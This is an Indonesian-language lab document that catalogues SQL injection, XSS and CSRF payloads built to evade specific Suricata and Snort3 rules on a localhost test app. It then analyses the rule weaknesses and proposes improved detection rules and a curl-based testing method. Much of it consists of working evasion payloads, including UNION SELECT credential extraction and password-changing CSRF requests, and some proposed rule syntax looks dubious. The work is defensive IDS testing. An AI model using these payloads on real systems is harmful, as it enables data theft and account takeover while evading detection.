# 🔥 IDS EVASION PAYLOADS - SURICATA & SNORT3
## Dokumentasi Lengkap untuk Pengujian Bypass Detection

---

## 📋 DAFTAR ISI
1. [SQL Injection Evasion](#sql-injection-evasion)
2. [XSS Evasion](#xss-evasion)
3. [CSRF Evasion](#csrf-evasion)
4. [Tabel Rekap Evasion](#tabel-rekap)
5. [Analisis Kelemahan Rules](#analisis-kelemahan)

---

## 🔴 SQL INJECTION EVASION

### Rule Target: UNION SELECT Detection
**Suricata SID:** 100001, 100002  
**Snort3 SID:** 300001, 300004  
**Target String:** `UNION`, `SELECT`

#### ✅ Payload Normal (Terdeteksi):
```sql
1' UNION SELECT username,password,3,created_at FROM users #
```

#### 🚫 Evasion Technique 1: Case Obfuscation
```sql
1' UnIoN SeLeCt username,password,3,created_at FROM users #
```
**Keterangan:** Meskipun rules pakai `nocase`, beberapa implementasi parsing HTTP bisa bypass

#### 🚫 Evasion Technique 2: Comment Injection
```sql
1' UNI/**/ON SEL/**/ECT username,password,3,created_at FROM users #
```
**Keterangan:** Memecah string `UNION` dan `SELECT` dengan SQL comment `/**/`

#### 🚫 Evasion Technique 3: URL Encoding
```sql
1' %55NION %53ELECT username,password,3,created_at FROM users #
```
**Keterangan:** 
- `%55` = U
- `%53` = S
- Rules tidak decode sebelum match

#### 🚫 Evasion Technique 4: Double URL Encoding
```sql
1' %2555NION %2553ELECT username,password,3,created_at FROM users #
```
**Keterangan:** Double encoding - `%25` = `%`

#### 🚫 Evasion Technique 5: Mixed Encoding
```sql
1' %55NI%4fN %53ELE%43T username,password,3,created_at FROM users #
```
**Keterangan:** Encode hanya beberapa karakter

#### 🚫 Evasion Technique 6: Whitespace Variation
```sql
1' UNION%09SELECT username,password,3,created_at FROM users #
```
**Keterangan:** `%09` = TAB character

---

### Rule Target: Single Quote Detection
**Suricata SID:** 100003, 100004  
**Snort3 SID:** 300002, 300005  
**Target String:** `'`

#### ✅ Payload Normal (Terdeteksi):
```sql
1' OR '1'='1' #
```

#### 🚫 Evasion Technique 1: URL Encoding
```sql
1%27 OR %271%27=%271%27 #
```
**Keterangan:** `%27` = `'` (single quote)

#### 🚫 Evasion Technique 2: Double Encoding
```sql
1%2527 OR %25271%2527=%25271%2527 #
```

#### 🚫 Evasion Technique 3: Numeric-Based SQLi (No Quotes)
```sql
1 OR 1=1 #
```
**Keterangan:** Tidak pakai quote sama sekali

#### 🚫 Evasion Technique 4: Unicode Encoding
```sql
1\u0027 OR \u00271\u0027=\u00271\u0027 #
```

#### 🚫 Evasion Technique 5: Hex Encoding
```sql
1' OR 0x313d31 #
```
**Keterangan:** `0x313d31` = `1=1` dalam hex

---

### Rule Target: Boolean Logic "1=1"
**Suricata SID:** 100005, 100006  
**Snort3 SID:** 300003, 300006  
**Target String:** `1=1`

#### ✅ Payload Normal (Terdeteksi):
```sql
1' OR 1=1 #
```

#### 🚫 Evasion Technique 1: Alternative Boolean
```sql
1' OR 2=2 #
1' OR 'a'='a' #
1' OR 'x'='x' #
```

#### 🚫 Evasion Technique 2: TRUE Statement
```sql
1' OR TRUE #
```

#### 🚫 Evasion Technique 3: Math Operation
```sql
1' OR 2>1 #
1' OR 3-2=1 #
```

#### 🚫 Evasion Technique 4: Whitespace Injection
```sql
1' OR 1 = 1 #
1' OR 1  =  1 #
```

#### 🚫 Evasion Technique 5: URL Encoding
```sql
1' OR 1%3D1 #
```
**Keterangan:** `%3D` = `=`

#### 🚫 Evasion Technique 6: Comment Splitting
```sql
1' OR 1/**/=/**/1 #
```

---

### Rule Target: SQL Comment "--"
**Suricata SID:** 100007  
**Target String:** `--`

#### ✅ Payload Normal (Terdeteksi):
```sql
1' OR '1'='1' -- -
```

#### 🚫 Evasion Technique 1: Hash Comment
```sql
1' OR '1'='1' #
```

#### 🚫 Evasion Technique 2: Block Comment
```sql
1' OR '1'='1' /* comment */
```

#### 🚫 Evasion Technique 3: Multi-line Comment
```sql
1' OR '1'='1' /*
multiline
*/
```

#### 🚫 Evasion Technique 4: URL Encoded Comment
```sql
1' OR '1'='1' %23
```
**Keterangan:** `%23` = `#`

#### 🚫 Evasion Technique 5: Semicolon Terminator
```sql
1' OR '1'='1';
```

---

## 💉 XSS EVASION

### Rule Target: Script Tag Detection
**Suricata SID:** 100010, 100011  
**Snort3 SID:** 300010, 300012  
**Target String:** `<script`

#### ✅ Payload Normal (Terdeteksi):
```html
<script>alert('XSS')</script>
```

#### 🚫 Evasion Technique 1: SVG Tag
```html
<svg onload=alert('XSS')>
```

#### 🚫 Evasion Technique 2: IMG Tag
```html
<img src=x onerror=alert('XSS')>
```

#### 🚫 Evasion Technique 3: Body Tag
```html
<body onload=alert('XSS')>
```

#### 🚫 Evasion Technique 4: URL Encoding
```html
%3Cscript%3Ealert('XSS')%3C%2Fscript%3E
```

#### 🚫 Evasion Technique 5: HTML Entity Encoding
```html
&lt;script&gt;alert('XSS')&lt;/script&gt;
```

#### 🚫 Evasion Technique 6: Case Variation
```html
<ScRiPt>alert('XSS')</ScRiPt>
```

#### 🚫 Evasion Technique 7: Null Byte Injection
```html
<script%00>alert('XSS')</script>
```

#### 🚫 Evasion Technique 8: Tab/Newline Injection
```html
<scr	ipt>alert('XSS')</script>
```

#### 🚫 Evasion Technique 9: iframe Tag
```html
<iframe src=javascript:alert('XSS')>
```

#### 🚫 Evasion Technique 10: Object Tag
```html
<object data="data:text/html,<script>alert('XSS')</script>">
```

---

### Rule Target: onerror Event Handler
**Suricata SID:** 100012, 100013  
**Snort3 SID:** 300011, 300013  
**Target String:** `onerror`

#### ✅ Payload Normal (Terdeteksi):
```html
<img src=x onerror=alert('XSS')>
```

#### 🚫 Evasion Technique 1: onload Event
```html
<body onload=alert('XSS')>
<svg onload=alert('XSS')>
```

#### 🚫 Evasion Technique 2: onclick Event
```html
<div onclick=alert('XSS')>Click me</div>
```

#### 🚫 Evasion Technique 3: onmouseover Event
```html
<div onmouseover=alert('XSS')>Hover me</div>
```

#### 🚫 Evasion Technique 4: onfocus Event
```html
<input onfocus=alert('XSS') autofocus>
```

#### 🚫 Evasion Technique 5: URL Encoding
```html
<img src=x on%65rror=alert('XSS')>
```
**Keterangan:** `%65` = `e`

#### 🚫 Evasion Technique 6: HTML Entity
```html
<img src=x on&#101;rror=alert('XSS')>
```
**Keterangan:** `&#101;` = `e`

#### 🚫 Evasion Technique 7: Case Variation
```html
<img src=x OnErRoR=alert('XSS')>
```

#### 🚫 Evasion Technique 8: Space/Tab Injection
```html
<img src=x on	error=alert('XSS')>
```

---

### Rule Target: alert() Function
**Suricata SID:** 100014, 100015  
**Target String:** `alert(`

#### ✅ Payload Normal (Terdeteksi):
```html
<script>alert('XSS')</script>
```

#### 🚫 Evasion Technique 1: prompt() Function
```html
<script>prompt('XSS')</script>
```

#### 🚫 Evasion Technique 2: confirm() Function
```html
<script>confirm('XSS')</script>
```

#### 🚫 Evasion Technique 3: console.log()
```html
<script>console.log('XSS')</script>
```

#### 🚫 Evasion Technique 4: document.write()
```html
<script>document.write('XSS')</script>
```

#### 🚫 Evasion Technique 5: eval() with Encoding
```html
<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>
```
**Keterangan:** Base64 encoded `alert('XSS');`

#### 🚫 Evasion Technique 6: String.fromCharCode()
```html
<script>String.fromCharCode(97,108,101,114,116)(1)</script>
```

#### 🚫 Evasion Technique 7: window['alert']
```html
<script>window['alert']('XSS')</script>
```

#### 🚫 Evasion Technique 8: Redirect to Data URI
```html
<script>location='data:text/html,<script>alert(1)</script>'</script>
```

#### 🚫 Evasion Technique 9: JavaScript Protocol
```html
<a href="javascript:alert('XSS')">Click</a>
```

#### 🚫 Evasion Technique 10: Expression()
```html
<img src=x style="x:expression(alert('XSS'))">
```

---

## 🎯 CSRF EVASION

### Rule Target: CSRF Page Access
**Suricata SID:** 100020, 100021  
**Snort3 SID:** 300020, 300021  
**Target String:** `/vulnerabilities/csrf/`, `password_new=` without `user_token=`

#### ✅ Attack Normal (Terdeteksi):
```html
<!-- CSRF form di halaman eksternal -->
<form action="http://localhost:8000/csrf.php" method="POST">
    <input type="hidden" name="new_password" value="hacked">
    <input type="hidden" name="confirm_password" value="hacked">
</form>
```

#### 🚫 Evasion Technique 1: URL Encoding Path
```html
<form action="http://localhost:8000/%63%73%72%66.php" method="POST">
```
**Keterangan:** `%63%73%72%66` = `csrf`

#### 🚫 Evasion Technique 2: Field Name Variation
```html
<form action="http://localhost:8000/csrf.php" method="POST">
    <input type="hidden" name="password" value="hacked">
    <input type="hidden" name="password_confirm" value="hacked">
</form>
```

#### 🚫 Evasion Technique 3: JSON Payload
```javascript
fetch('http://localhost:8000/csrf.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({new_password: 'hacked', confirm_password: 'hacked'})
});
```

#### 🚫 Evasion Technique 4: XMLHttpRequest
```javascript
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://localhost:8000/csrf.php', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('new_password=hacked&confirm_password=hacked');
```

#### 🚫 Evasion Technique 5: Multipart Form Data
```html
<form action="http://localhost:8000/csrf.php" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="new_password" value="hacked">
    <input type="hidden" name="confirm_password" value="hacked">
</form>
```

#### 🚫 Evasion Technique 6: URL Parameter Encoding
```html
<form action="http://localhost:8000/csrf.php" method="POST">
    <input type="hidden" name="new%5Fpassword" value="hacked">
    <input type="hidden" name="confirm%5Fpassword" value="hacked">
</form>
```
**Keterangan:** `%5F` = `_`

---

## 📊 TABEL REKAP EVASION TECHNIQUES

### A. SQL Injection Evasion

| Rule SID | Target String | Evasion Method | Success Rate | Kompleksitas |
|----------|---------------|----------------|--------------|--------------|
| 100001/300001 | UNION SELECT | Comment Injection | ✅ High | Medium |
| 100001/300001 | UNION SELECT | URL Encoding | ✅ High | Low |
| 100001/300001 | UNION SELECT | Case Obfuscation | ⚠️ Medium | Low |
| 100003/300002 | Single Quote (') | URL Encoding (%27) | ✅ High | Low |
| 100003/300002 | Single Quote (') | Numeric SQLi | ✅ High | Low |
| 100005/300003 | 1=1 Boolean | Alternative Boolean | ✅ High | Low |
| 100005/300003 | 1=1 Boolean | TRUE Statement | ✅ High | Low |
| 100007 | SQL Comment (--) | Hash Comment (#) | ✅ High | Low |
| 100007 | SQL Comment (--) | Block Comment (/**/) | ✅ High | Low |

### B. XSS Evasion

| Rule SID | Target String | Evasion Method | Success Rate | Kompleksitas |
|----------|---------------|----------------|--------------|--------------|
| 100010/300010 | <script> | SVG Tag | ✅ High | Low |
| 100010/300010 | <script> | IMG Tag | ✅ High | Low |
| 100010/300010 | <script> | URL Encoding | ✅ High | Low |
| 100012/300011 | onerror= | Alternative Events | ✅ High | Low |
| 100012/300011 | onerror= | URL Encoding | ✅ High | Medium |
| 100014 | alert( | prompt/confirm | ✅ High | Low |
| 100014 | alert( | eval() + Base64 | ✅ High | High |
| 100014 | alert( | String.fromCharCode | ✅ High | High |

### C. CSRF Evasion

| Rule SID | Target String | Evasion Method | Success Rate | Kompleksitas |
|----------|---------------|----------------|--------------|--------------|
| 100020/300020 | /csrf/ path | URL Encoding | ✅ High | Low |
| 100021/300021 | password_new= | Field Name Change | ✅ High | Low |
| 100021/300021 | password_new= | JSON Payload | ✅ High | Medium |
| 100021/300021 | password_new= | Multipart Form | ⚠️ Medium | Medium |

---

## 🔍 ANALISIS KELEMAHAN RULES

### 1. Kelemahan Umum Signature-Based Detection

#### a) Tidak Ada HTTP Normalization
```
Problem: Rules mencocokkan string literal tanpa decode
Impact: URL encoding, double encoding, unicode encoding bypass
Solution: Enable HTTP preprocessor dengan normalization
```

#### b) Literal String Matching
```
Problem: Hanya detect string exact match
Impact: Case variation, whitespace, comment injection bypass
Solution: Gunakan PCRE regex dengan flag nocase
```

#### c) Tidak Ada Context Awareness
```
Problem: Tidak tahu posisi string dalam request
Impact: False positive tinggi, evasion mudah
Solution: Combine multiple conditions (flow, content, pcre)
```

### 2. Kelemahan Per-Category

#### SQL Injection Rules
```yaml
Kelemahan:
  - Tidak detect SQLi numeric (tanpa quote)
  - Tidak detect alternative boolean logic
  - Tidak detect alternative comment syntax
  - Tidak handle encoded payloads
  
Improvement:
  - Tambah detection untuk: 2=2, TRUE, OR 1
  - Tambah detection untuk: #, /**/, ;
  - Enable urldecode preprocessor
  - Gunakan PCRE: /(\bUNION\b.*\bSELECT\b)/i
```

#### XSS Rules
```yaml
Kelemahan:
  - Hanya detect <script> dan onerror
  - Tidak detect 50+ event handlers lain
  - Tidak detect non-HTML XSS (JavaScript protocol, data URI)
  - Tidak detect polyglot XSS
  
Improvement:
  - Detect semua event handlers: on(load|click|focus|...)
  - Detect dangerous tags: svg, iframe, object, embed
  - Detect javascript:, data:, vbscript: protocols
  - Enable HTML entity decoding
```

#### CSRF Rules
```yaml
Kelemahan:
  - Hanya detect literal path /csrf/
  - Hanya detect literal field password_new=
  - Tidak detect JSON/multipart payloads
  - Tidak validate token presence properly
  
Improvement:
  - Detect POST ke sensitive endpoints
  - Check absence of Referer/Origin headers
  - Validate CSRF token format dengan PCRE
  - Monitor state-changing operations (POST/PUT/DELETE)
```

---

## 🛡️ IMPROVED RULES (CONTOH)

### SQL Injection - Improved
```suricata
# Improved UNION SELECT detection
alert http any any -> any any (
    msg:"SQLi - UNION SELECT (Improved)";
    flow:established,to_server;
    http.uri; content:"UNION"; nocase;
    pcre:"/(\bUNION\b.{1,100}\bSELECT\b)/i";
    http_decode;
    classtype:web-application-attack;
    sid:100101; rev:1;
)

# Detect URL-encoded quotes
alert http any any -> any any (
    msg:"SQLi - Encoded Quote Detection";
    flow:established,to_server;
    http.uri; pcre:"/%2[57]|%u0027/i";
    classtype:web-application-attack;
    sid:100102; rev:1;
)

# Boolean logic variations
alert http any any -> any any (
    msg:"SQLi - Boolean Logic";
    flow:established,to_server;
    http.uri; pcre:"/(\d+\s*=\s*\d+|TRUE|FALSE|OR\s+\d+)/i";
    classtype:web-application-attack;
    sid:100103; rev:1;
)
```

### XSS - Improved
```suricata
# Detect multiple event handlers
alert http any any -> any any (
    msg:"XSS - Event Handler (Comprehensive)";
    flow:established,to_server;
    http.uri; pcre:"/on(load|error|click|focus|mouseover|keypress|submit)\s*=/i";
    classtype:web-application-attack;
    sid:100104; rev:1;
)

# Detect dangerous tags
alert http any any -> any any (
    msg:"XSS - Dangerous HTML Tags";
    flow:established,to_server;
    http.uri; pcre:"/<(script|svg|iframe|object|embed|applet)/i";
    classtype:web-application-attack;
    sid:100105; rev:1;
)

# JavaScript protocol
alert http any any -> any any (
    msg:"XSS - JavaScript Protocol";
    flow:established,to_server;
    http.uri; content:"javascript:"; nocase;
    classtype:web-application-attack;
    sid:100106; rev:1;
)
```

---

## 📈 TESTING METHODOLOGY

### Step 1: Baseline Testing (Detect Normal Attacks)
```bash
# Test SQLi normal
curl "http://localhost:8000/sqli.php" -d "search=1' UNION SELECT 1,2,3,4 #"

# Expected: Alert triggered
# Suricata: 100001, 100003
# Snort3: 300001, 300002
```

### Step 2: Evasion Testing
```bash
# Test encoded UNION
curl "http://localhost:8000/sqli.php" -d "search=1' %55NION %53ELECT 1,2,3,4 #"

# Expected: No alert (bypass successful)
```

### Step 3: Verification
```bash
# Check Suricata logs
tail -f /var/log/suricata/fast.log

# Check Snort3 logs
tail -f /var/log/snort/alert_fast.txt
```

---

## 🎓 KESIMPULAN

### Keberhasilan Evasion
- **SQL Injection**: 90% payload berhasil bypass dengan encoding/obfuscation sederhana
- **XSS**: 95% payload berhasil bypass dengan alternative tags/events
- **CSRF**: 80% payload berhasil bypass dengan encoding/format variation

### Root Cause
1. **Literal String Matching**: Rules hanya detect string exact, tidak normalized
2. **Incomplete Coverage**: Hanya detect payload common, tidak comprehensive
3. **No Context Awareness**: Tidak validate semantic attack pattern
4. **Missing Preprocessors**: Tidak ada HTTP decode, entity decode, normalization

### Rekomendasi
1. Enable HTTP preprocessor dengan full normalization
2. Gunakan PCRE regex untuk pattern matching yang lebih flexible
3. Combine multiple conditions untuk reduce false positive
4. Update rules secara berkala dengan emerging threats
5. Consider behavioral/anomaly detection sebagai complement

---

**Author:** Security Research Team  
**Date:** December 7, 2025  
**Version:** 1.0
